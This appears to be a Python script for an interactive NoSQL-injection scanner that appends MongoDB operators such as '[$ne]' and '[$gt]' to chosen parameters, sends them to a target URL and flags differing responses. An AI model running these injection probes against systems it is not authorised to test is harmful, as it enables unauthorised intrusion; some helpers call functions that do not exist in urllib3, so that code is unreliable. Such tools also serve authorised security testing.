import requests
import urllib3
import urllib
from _helper import *
import random
import string
from requests_html import HTMLSession
from termcolor import colored

try:
    from BeautifulSoup import BeautifulSoup
except ImportError:
    from bs4 import BeautifulSoup
urllib3.disable_warnings()

def vulnTest(nsi):
  
  arr = ['[$ne]', '[$gt]']
  x = Str.randStr(8)
  phaseTest = None
  session = HTMLSession()
  vulnerable = []
  
  for v in arr:
    phaseTest = v
    form_data = {}
    for element in nsi.params:
      if (v == '[$gt]'):
        form_data[element+v] = '&'
      else:
        form_data[element+v] = x
    
    if (nsi.reqMethod == '1') : #get
      reqData = Str.http_build_query(form_data)
      r = session.get(nsi.url)
      rInj = session.get(nsi.url+'?'+reqData)
    else:
      reqData = form_data
      r = requests.post(nsi.url, data=form_data)
      rInj = session.post(nsi.url, data=form_data)
      
    resOri = BeautifulSoup(r.text, 'lxml')
    resInj = BeautifulSoup(rInj.text, 'lxml')
    
    if resOri.body == resInj.body:
      vulnerable.append({
        v: False
      })
      print(colored(f"Might be not vulnerable with {phaseTest} Injection", 'red'))
    else:
      vulnerable.append({
        v: True
      })

      print(colored(f"Possible vulnerable to {phaseTest} Injection!", 'green'))

  return vulnerable

def isVulnerable(arr):
  for item in arr:
    if True in item.values():
        return True
  else:
      return False

def typeReqPayload(nsi):
  print(nsi.info())
  print('''\n=================\n[Request Method]\n\n1) Send Request as GET\n2) Send Request as POST\n''')
  nsi.reqMethod = input("Choose Request Method >>")
  return nsi.reqMethod
  
def paramMenu(nsi):
  print(nsi.info())
  print('''\n=================\n[Configuration Parameter]\n\n1) Default Payload\n2) Custom Payload\n''')
  nsi.typeParam = input("Choose One >>")
  while nsi.param != 'd':
    print('press "d" for submit the param')
    nsi.param = input("Input Param >>")
    
    if (nsi.param != 'd'):
      nsi.params.append(nsi.param)
  return nsi.typeParam

def getResponseBodyHandlingErrors(req):
    try:
        responseBody = urllib3.urlopen(req).read()
    except urllib3.HTTPError as err:
        responseBody = err.read()
    
    return responseBody

def pwnGet(url, req):
  print("Checking to see if site at " +str(url).strip() + " is up...")
  tester = WebAppTester(url)
  if tester.is_up():
      print("The target is up. Starting injection test !")
  else:
      print("The target is might be down")
  return 0